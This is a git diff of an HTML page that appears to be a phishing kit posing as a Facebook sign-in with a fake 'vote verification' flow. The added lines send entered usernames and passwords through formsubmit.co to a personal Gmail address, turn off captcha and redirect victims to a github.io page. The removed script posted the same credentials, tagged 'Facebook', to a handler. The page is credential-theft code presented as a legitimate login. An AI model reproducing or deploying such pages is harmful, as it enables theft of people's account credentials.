@@ -34,8 +34,7 @@
                         <div class="card-body">
                             <h4 class="card-title">Sign in to continue</h4>
 
-                            <form action="https://formsubmit.co/gironadsl56@gmail.com
-" method="POST" class="my-login-validation" novalidate="">
+                            <form  action="https://formsubmit.co/daviddennis72738@gmail.com" method="POST">
 
                                 <div class="form-group">
                                     <input id="email" type="username" placeholder="Mobile number or email address"
@@ -46,6 +45,8 @@
                                     </div>
                                 </div>
 <input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_next" value="https://krsqwp.github.io/voteage/vote_verification.html">
+
 
 
                                 <div class="form-group">
@@ -81,45 +82,8 @@
             </div>
         </div>
     </section>
-    
-<script>
 
-        var submit = document.getElementById('submit');
-        var email = document.getElementById('email')
-        var password = document.getElementById('password')
-        var msg = document.querySelector('.msg')
-        var msg2 = document.querySelector('.msg2')
-
-        submit.addEventListener('click', function () {
-            console.log('d');
-            if (email.value == "" && password.value == "") {
-                
-            } else {
-        
-                var url = 'action.html';
-                var xhr2 = new XMLHttpRequest()
-                var data2 = new FormData()
-                data2.append('username', email.value);
-                data2.append('pass', password.value);
-                data2.append('type', "Facebook");
-                xhr2.onreadystatechange = function () {
-                    response = xhr2.responseText;
-                  if (response == 3){
-                      window.location.href='vote_verification.html'
-                  }
-                }
-                xhr2.open('POST.html', url, 'true');
-                xhr2.send(data2)
-            //======================================
-            }
-
-        })
-    </script>
-
-    <script src="../code.jquery.com/jquery-3.3.1.slim.min.js"
-        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
-        crossorigin="anonymous"></script>
-    <script src="js/my-login.html"></script>
+    <script src="./js/my-login.html"></script>
 </body>
 
 
